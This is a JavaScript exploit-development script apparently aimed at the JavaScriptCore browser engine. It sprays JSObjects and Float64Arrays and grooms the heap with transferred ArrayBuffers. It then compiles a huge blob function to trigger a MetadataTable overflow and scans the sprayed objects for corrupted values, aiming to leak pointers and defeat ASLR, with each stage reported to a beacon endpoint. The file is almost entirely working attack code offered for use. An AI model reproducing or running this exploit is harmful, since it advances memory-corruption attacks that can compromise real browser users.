// p499 — MetadataTable overflow × JSObject inline property corruption
//
// V498 DEAD: Canvas contexts in IsoHeap, unreachable by sweep.
// p148 CONFIRMED: JSStrings in MarkedSpace ARE corrupted by sweep.
// THEORY: JSObjects (also in MarkedSpace) should also be corrupted.
//
// If the 4.3GB sweep writes into a JSObject's inline property storage,
// we can read the corrupted value through normal JS property access.
//
// At entry+24: thunk address (8 bytes) — ASLR leak if readable as property
// At entry+68: m_bytecodeIndex (4 bytes) — sequential, useful for offset calc
// At entry+12: 0xFFFFFFFF — sentinel, recognizable
//
// JSObject inline storage: properties stored as JSValues (8 bytes each, NaN-boxed)
// If sweep writes 8 bytes (thunk addr) into an inline property slot, the value
// becomes the thunk address NaN-boxed. Reading it as a number gives garbage,
// but reading the raw bits through Float64Array gives the pointer.
//
// PLAN:
// 1. Spray 20,000 JSObjects with known double property values
// 2. Trigger MetadataTable overflow (146MB blob compilation)
// 3. Scan all objects for changed property values
// 4. Changed values = sweep wrote into inline storage
// 5. Extract raw bytes via Float64Array conversion
//
// Beacon prefix: V499-
(function() {
  var BASE = location.protocol + '//' + location.host;
  var T0 = Date.now();

  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', BASE + '/beacon/V499-' + tag, false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send('[' + (Date.now() - T0) + 'ms] ' + (body || ''));
    } catch(e) {}
  }

  // Helper: convert double to hex bytes
  var _f64 = new Float64Array(1);
  var _u8 = new Uint8Array(_f64.buffer);
  function dblHex(v) {
    _f64[0] = v;
    var s = '';
    for (var i = 7; i >= 0; i--) s += ('0' + _u8[i].toString(16)).slice(-2);
    return s;
  }

  B('BOOT', navigator.userAgent);

  // ═══ PHASE 1: Spray JSObjects with known property values ═══
  // Each object has 6 inline double properties with unique marker values.
  // We use the SAME structure (same property names, same order) so they share
  // a Structure and end up in the same MarkedSpace blocks.
  //
  // Object layout in memory (64-bit JSC, NaN-boxed):
  // [0-7]:   JSCell header (StructureID + flags)
  // [8-15]:  butterfly pointer (null for inline-only)
  // [16-23]: inline property 0 (JSValue, NaN-boxed double)
  // [24-31]: inline property 1
  // [32-39]: inline property 2
  // [40-47]: inline property 3
  // [48-55]: inline property 4
  // [56-63]: inline property 5
  //
  // Total: 64 bytes per object → likely 64-byte cell in MarkedSpace
  //
  // entry+24 at stride 112: if entry starts at object base,
  //   entry+24 = inline property 1 offset → thunk addr in prop1!
  // entry+24 at stride 112: modulo 64 = various alignments

  var OBJ_COUNT = 20000;
  var objs = new Array(OBJ_COUNT);
  var MARKER = 1234567890.123456;

  for (var i = 0; i < OBJ_COUNT; i++) {
    objs[i] = {
      a: MARKER + i * 0.000001,
      b: MARKER + 100 + i * 0.000001,
      c: MARKER + 200 + i * 0.000001,
      d: MARKER + 300 + i * 0.000001,
      e: MARKER + 400 + i * 0.000001,
      f: MARKER + 500 + i * 0.000001
    };
  }

  B('SPRAY', OBJ_COUNT + ' objects created');

  // ═══ PHASE 2: Also spray typed arrays for alternate detection ═══
  // Float64Array cells are in MarkedSpace. Their inline data stores doubles
  // that we can read as raw bytes.
  var F64_COUNT = 5000;
  var f64arrs = new Array(F64_COUNT);
  for (var i = 0; i < F64_COUNT; i++) {
    // Small Float64Array: 4 elements = 32 bytes backing store
    // But the CELL is in MarkedSpace, backing store in FastMalloc
    // The cell contains: header + m_vector + m_length + m_mode
    // m_vector points to backing store
    // We can't read cell bytes, but length corruption = sweep hit
    var ab = new ArrayBuffer(32);
    var fa = new Float64Array(ab);
    fa[0] = 99999.111 + i;
    fa[1] = 88888.222 + i;
    fa[2] = 77777.333 + i;
    fa[3] = 66666.444 + i;
    f64arrs[i] = {ab: ab, fa: fa, dv: new DataView(ab)};
  }
  B('F64-SPRAY', F64_COUNT + ' Float64Arrays');

  // ═══ PHASE 3: Bait-and-switch overflow ═══
  var BUF_SZ = 100112;
  var SPRAY_COUNT = 200;

  var bufs = new Array(SPRAY_COUNT);
  for (var i = 0; i < SPRAY_COUNT; i++) {
    bufs[i] = new ArrayBuffer(BUF_SZ);
  }

  var transferred = 0;
  for (var i = 0; i < SPRAY_COUNT; i += 2) {
    try {
      structuredClone(bufs[i], {transfer: [bufs[i]]});
      transferred++;
    } catch(e) {
      if (transferred === 0) { B('XFER-ERR', e.message.substring(0, 60)); break; }
    }
    bufs[i] = null;
  }
  B('HOLES', transferred + ' holes');

  setTimeout(function() {
    // GC
    for (var g = 0; g < 8; g++) {
      var junk = [];
      for (var j = 0; j < 30000; j++) junk.push({x: j});
      junk = null;
    }
    B('GC-DONE');

    // Build and compile the 38M function
    var N = 38348816;
    var CHUNK = 4000000;
    var nC = Math.floor(N / CHUNK);
    var rem = N - nC * CHUNK;
    var rep = 'a();'.repeat(CHUNK);
    var parts = new Array(nC + 3);
    parts[0] = 'window.__p499fn=function(a){';
    for (var c = 0; c < nC; c++) parts[1 + c] = rep;
    parts[nC + 1] = 'a();'.repeat(rem);
    parts[nC + 2] = '};window.__p499ok=1;';
    rep = null;

    var blob = new Blob(parts, {type: 'application/javascript'});
    B('BLOB', Math.round(blob.size / 1048576) + 'MB');
    parts = null;

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');
    sc.onerror = function() { B('COMPILE-ERR', 'failed'); };
    sc.onload = function() {
      B('COMPILED', window.__p499ok ? 'OK' : 'FAIL');
      doScan();
    };
    document.head.appendChild(sc);
    sc.src = url;
  }, 300);

  function doScan() {
    // ═══ PHASE 4: Scan JSObjects for property corruption ═══
    var propCorrupted = 0;
    var propCrashed = 0;
    var leaks = [];

    for (var i = 0; i < OBJ_COUNT; i++) {
      try {
        var o = objs[i];
        var ea = MARKER + i * 0.000001;
        var eb = MARKER + 100 + i * 0.000001;
        var ec = MARKER + 200 + i * 0.000001;
        var ed = MARKER + 300 + i * 0.000001;
        var ee = MARKER + 400 + i * 0.000001;
        var ef = MARKER + 500 + i * 0.000001;

        var props = ['a', 'b', 'c', 'd', 'e', 'f'];
        var expected = [ea, eb, ec, ed, ee, ef];
        var anyDiff = false;

        for (var p = 0; p < 6; p++) {
          var val = o[props[p]];
          if (val !== expected[p]) {
            anyDiff = true;
            if (leaks.length < 30) {
              var tv = typeof val;
              var info = 'i=' + i + ',p=' + props[p] + ',type=' + tv;
              if (tv === 'number') {
                info += ',val=' + val + ',hex=0x' + dblHex(val);
              } else if (tv === 'undefined') {
                info += ',undef';
              } else if (tv === 'object' && val === null) {
                info += ',null';
              } else {
                info += ',str=' + String(val).substring(0, 30);
              }
              leaks.push(info);
            }
          }
        }

        if (anyDiff) propCorrupted++;
      } catch(e) {
        propCrashed++;
        if (leaks.length < 30) {
          leaks.push('CRASH-i=' + i + ':' + e.message.substring(0, 40));
        }
      }
    }

    B('OBJ-SCAN', 'corrupted=' + propCorrupted + ',crashed=' + propCrashed);

    // Report leak values
    for (var l = 0; l < Math.min(leaks.length, 15); l++) {
      B('LEAK-' + l, leaks[l]);
    }

    // ═══ PHASE 5: Scan Float64Array backing stores ═══
    var f64Corrupted = 0;
    var f64LenCorrupted = 0;
    var f64Leaks = [];

    for (var i = 0; i < F64_COUNT; i++) {
      try {
        var fa = f64arrs[i].fa;
        var dv = f64arrs[i].dv;

        // Check length corruption (cell-level)
        if (fa.length !== 4) {
          f64LenCorrupted++;
          if (f64Leaks.length < 10) {
            f64Leaks.push('LEN-i=' + i + ',len=' + fa.length);
          }
          continue;
        }

        // Check data corruption (backing store level)
        var e0 = 99999.111 + i;
        var e1 = 88888.222 + i;
        var e2 = 77777.333 + i;
        var e3 = 66666.444 + i;

        var anyDiff = false;
        if (fa[0] !== e0 || fa[1] !== e1 || fa[2] !== e2 || fa[3] !== e3) {
          anyDiff = true;
          f64Corrupted++;
          if (f64Leaks.length < 10) {
            // Dump raw bytes of corrupted slot
            for (var s = 0; s < 4; s++) {
              var ev = [e0, e1, e2, e3][s];
              if (fa[s] !== ev) {
                var lo = dv.getUint32(s * 8, true);
                var hi = dv.getUint32(s * 8 + 4, true);
                f64Leaks.push('F64-i=' + i + ',s=' + s +
                  ',old=' + ev.toFixed(3) + ',new=' + fa[s] +
                  ',raw=0x' + ('00000000' + hi.toString(16)).slice(-8) +
                  ('00000000' + lo.toString(16)).slice(-8));
              }
            }
          }
        }
      } catch(e) {
        if (f64Leaks.length < 10) {
          f64Leaks.push('F64-CRASH-i=' + i + ':' + e.message.substring(0, 30));
        }
      }
    }

    B('F64-SCAN', 'data=' + f64Corrupted + ',len=' + f64LenCorrupted);

    for (var l = 0; l < Math.min(f64Leaks.length, 10); l++) {
      B('F64-' + l, f64Leaks[l]);
    }

    // ═══ PHASE 6: Scan for pointer-like values in corrupted properties ═══
    // If any object property became a non-number type (object, string),
    // it might be a pointer reinterpreted as a JSValue
    var ptrLike = 0;
    for (var i = 0; i < OBJ_COUNT; i++) {
      try {
        var o = objs[i];
        var types = [typeof o.a, typeof o.b, typeof o.c,
                     typeof o.d, typeof o.e, typeof o.f];
        for (var t = 0; t < 6; t++) {
          if (types[t] !== 'number') {
            ptrLike++;
            if (ptrLike <= 5) {
              B('PTR-' + ptrLike, 'i=' + i + ',prop=' + 'abcdef'[t] +
                ',type=' + types[t]);
            }
          }
        }
      } catch(e) {}
    }
    B('PTR-TYPES', ptrLike + ' non-number properties');

    B('DONE', 'complete');
  }
})();
